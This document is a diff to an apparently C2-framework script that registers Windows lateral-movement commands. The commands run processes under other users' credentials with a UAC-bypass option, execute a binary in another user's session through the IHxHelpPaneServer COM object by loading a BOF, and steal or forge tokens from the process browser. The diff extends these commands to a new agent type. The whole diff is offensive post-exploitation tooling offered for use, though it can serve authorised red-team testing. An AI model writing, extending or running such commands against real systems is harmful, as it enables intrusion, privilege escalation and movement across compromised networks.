@@ -159,16 +159,16 @@ cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);
 
 
 
-var cmd_runas = ax.create_command("runas", "Run a command as another user using explicit credentials (RunasCs-like)", "runas admin P@ssword domain.local \"cmd /c whoami\" -l 9 -t 30000 -o -b");
-cmd_runas.addArgString("username", true, "Username for authentication");
-cmd_runas.addArgString("password", true, "Password for authentication");
-cmd_runas.addArgString("domain", true, "Domain (use '.' for local)");
-cmd_runas.addArgString("command", true, "Command line to execute");
-cmd_runas.addArgFlagInt("-l", "logon_type", "Logon type: 2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials", 2);
-cmd_runas.addArgFlagInt("-t", "timeout", "Timeout in milliseconds to wait for process output (default: 120000)", 0);
-cmd_runas.addArgBool("-o", "With output capture");
-cmd_runas.addArgBool("-b", "Bypass UAC (use with admin credentials)");
-cmd_runas.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+var cmd_runas_user = ax.create_command("runas-user", "Run a command as another user using explicit credentials (RunasCs-like)", "runas admin P@ssword domain.local \"cmd /c whoami\" -l 9 -t 30000 -o -b");
+cmd_runas_user.addArgString("username", true, "Username for authentication");
+cmd_runas_user.addArgString("password", true, "Password for authentication");
+cmd_runas_user.addArgString("domain", true, "Domain (use '.' for local)");
+cmd_runas_user.addArgString("command", true, "Command line to execute");
+cmd_runas_user.addArgFlagInt("-l", "logon_type", "Logon type: 2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials", 2);
+cmd_runas_user.addArgFlagInt("-t", "timeout", "Timeout in milliseconds to wait for process output (default: 120000)", 0);
+cmd_runas_user.addArgBool("-o", "With output capture");
+cmd_runas_user.addArgBool("-b", "Bypass UAC (use with admin credentials)");
+cmd_runas_user.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let username   = parsed_json["username"];
     let password   = parsed_json["password"];
     let domain     = parsed_json["domain"];
@@ -187,8 +187,29 @@ cmd_runas.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token, cmd_runas]);
-ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);
+
+var cmd_runas_session = ax.create_command("runas-session", "Execute binary in another user's session via IHxHelpPaneServer COM", "runas-session 3 C:\\Windows\\Temp\\file.exe");
+cmd_runas_session.addArgInt("session_id", true);
+cmd_runas_session.addArgString("filepath", true);
+cmd_runas_session.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let sessId = parsed_json["session_id"];
+    let path   = parsed_json["filepath"];
+
+    if( ax.is64(id) == false ) { throw new Error("WoW64 is not supported"); }
+
+    if( ax.isadmin(id) == false ) { throw new Error("You need to be admin to run nanodump"); }
+
+    let bof_params = ax.bof_pack("int,wstr", [sessId, path]);
+    let bof_path = ax.script_dir() + "_bin/runas_sess_ihxexec." + ax.arch(id) + ".o";
+    let message = `Task: Cross-Sessions executeion ${path}`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
+var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token, cmd_runas_user, cmd_runas_session]);
+ax.register_commands_group(group_test, ["beacon", "gopher", "kharon"], ["windows"], []);
 
 
 
@@ -200,7 +221,7 @@ let token_steal_action = menu.create_action("Steal token", function(process_list
         ax.execute_command(proc.agent_id, "token steal " + proc.pid);
     }
 });
-menu.add_processbrowser(token_steal_action, ["beacon", "gopher"], ["windows"]);
+menu.add_processbrowser(token_steal_action, ["beacon", "gopher", "kharon"], ["windows"]);
 
 let token_make_action = menu.create_action("Make token", function(agent_list) {
     if (agent_list.length > 0 ) {
@@ -257,7 +278,7 @@ let token_make_action = menu.create_action("Make token", function(agent_list) {
         }
     }
 });
-menu.add_session_access(token_make_action, ["beacon", "gopher"], ["windows"]);
+menu.add_session_access(token_make_action, ["beacon", "gopher", "kharon"], ["windows"]);
 
 
 
